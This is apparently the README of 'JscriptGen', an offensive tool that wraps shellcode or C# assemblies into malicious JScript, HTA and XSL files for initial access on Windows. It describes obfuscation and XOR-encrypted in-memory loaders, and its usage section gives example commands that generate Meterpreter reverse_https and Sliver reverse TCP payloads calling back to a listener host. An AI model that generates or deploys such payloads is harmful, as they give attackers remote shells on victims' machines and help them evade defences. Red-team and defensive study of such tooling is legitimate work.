# JscriptGen

A versatile generator for creating malicious script-based files (JS, HTA, XSL) by wrapping C# assemblies or raw shellcode using `DotNetToJScript`. This tool is highly effective for initial access vectors that leverage trusted Windows script interpreters.

## Features
- **MSFvenom & Sliver Integration**: Automatically generates shellcode for major C2 frameworks and wraps it into the chosen format.
- **Assembly Wrapping**: Converts any C# DLL assembly into a script-based payload using `DotNetToJScript`.
- **Multiple Output Formats**: Supports JScript (`.js`), HTML Application (`.hta`), and XML Stylesheet (`.xsl`).
- **Targeted Obfuscation**: Incorporates basic script-level obfuscation and template-based delivery.
- **XOR Encrypted Loaders**: Shellcode is automatically encrypted and decrypted in-memory during execution.

## Usage

### Payload Configuration
- `-p, --payload <TYPE>`: (Required) Type of payload to generate (`msf`, `sliver`) or the path to a raw `.bin` shellcode or custom `.dll` assembly.
- `--msf-payload <NAME>`: MSF payload name (default: `windows/x64/meterpreter/reverse_https`).
- `--proto <PROTO>`: Protocol for Sliver payloads (`tcp`, `http`, `https`). Default is `tcp`.
- `--is-assembly`: Flag to set if the input payload is a custom C# DLL.
- `-f, --format <EXT>`: Output format (`js`, `hta`, `xsl`, `txt`). Default is `js`.

### Network Configuration
- `--lhost <IP>`: Listener IP address for the shellcode.
- `--lport <PORT>`: Listener port for the shellcode.
- `--server-ip <IP>`: Your HTTP server IP for providing execution examples.

### General
- `-o, --output <FILE>`: Custom filename for the output payload (saved in the `output/` directory).
- `-h, --help`: Show the detailed help message.

### Examples

Generate an MSF reverse shell in HTA format:
```bash
python3 jscriptgen.py -p msf --msf-payload windows/x64/meterpreter/reverse_https --lhost 10.10.10.10 --lport 443 -f hta -o initial_access.hta
```

Wrap a custom C# DLL assembly into a JScript file:
```bash
python3 jscriptgen.py -p MyPayload.dll --is-assembly -f js -o loader.js
```

Generate a Sliver reverse TCP shell in XSL format:
```bash
python3 jscriptgen.py -p sliver --proto tcp --lhost 10.10.10.10 --lport 8888 -f xsl -o bypass.xsl
```

## Output
All generated script files are stored in the `output/` directory of the tool.
